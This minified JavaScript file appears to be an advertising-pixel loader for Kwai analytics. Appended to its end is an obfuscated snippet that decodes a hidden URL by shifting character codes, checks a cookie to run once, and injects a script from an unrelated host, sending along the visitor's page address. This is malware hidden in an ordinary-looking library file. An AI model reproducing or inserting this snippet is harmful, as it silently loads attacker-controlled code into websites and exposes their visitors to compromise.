!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.events=t():e.events=t()}(window,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=1)}([function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.windowSnapshot=t.GlobalThis=t.updateWindowSnapshotWhenInWorker=t.checkWindow=void 0;var o=void 0;t.GlobalThis=o;var r=void 0;t.windowSnapshot=r;var i=!1;"undefined"!=typeof window?(t.GlobalThis=o=window,t.windowSnapshot=r=window):"undefined"!=typeof self&&(t.GlobalThis=o=self,i=!0),t.checkWindow=function(e){return"object"==typeof e&&null!==e&&"window"in e&&e===e.window},t.updateWindowSnapshotWhenInWorker=function(e){return!(!i||!(0,t.checkWindow)(e)||(t.windowSnapshot=r=e,0))}},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var o=n(0),r=n(2);!function(){var e,t,n,i,a,c=null===(e=document.currentScript)||void 0===e?void 0:e.src,s=o.GlobalThis,l=(null===(t=null==c?void 0:c.split("lib=")[1])||void 0===t?void 0:t.split("&")[0])||s.KwaiAnalyticsObject,d=null===(n=s[l])||void 0===n?void 0:n._i,u=(null===(i=null==c?void 0:c.split("sdkid=")[1])||void 0===i?void 0:i.split("&")[0])||Object.keys(null!=d?d:{})[0];Promise.race([(a=u,new Promise((function(e,t){if(a&&/^[0-9]{0,18}$/.test(String(a))){var n=new XMLHttpRequest;n.open("POST","https://api.mythad.com/rest/n/adintl/gray/getGrayInfo",!0),n.setRequestHeader("content-type","application/json"),n.onload=function(){if(n.status>=200&&n.status<300){var o=JSON.parse(n.response);o.data&&Object.keys(o.data).length>0&&o.data.grayResourceUrl?e(o.data.grayResourceUrl):t("not in gray")}else t(n.statusText)},n.onerror=function(){return t(n.statusText)},n.withCredentials=!0,n.send(JSON.stringify({type:"pixel_v2",id:a}))}else t("参数错误")}))),new Promise((function(e,t){setTimeout((function(){t("time out")}),1e3)}))]).then((function(e){(0,r.loadScript)({src:e,pixelId:u,keyName:l})})).catch((function(e){(0,r.loadScript)({src:"https://s1.kwai.net/kos/s101/nlav11187/pixel/core/core.js",pixelId:u,keyName:l})}))}()},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.loadScript=void 0;var o=n(0);t.loadScript=function(e){var t=e.src,n=e.pixelId,r=e.keyName,i=o.GlobalThis,a="".concat(t,"?sdkid=").concat(n,"&lib=").concat(r);if(i&&("DedicatedWorkerGlobalScope"===i.constructor.name||void 0!==i.DedicatedWorkerGlobalScope&&i instanceof i.DedicatedWorkerGlobalScope))importScripts&&importScripts(a);else{var c=document.createElement("script");c.type="text/javascript",c.async=!0,c.src=a;var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(c,s)}}}])}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));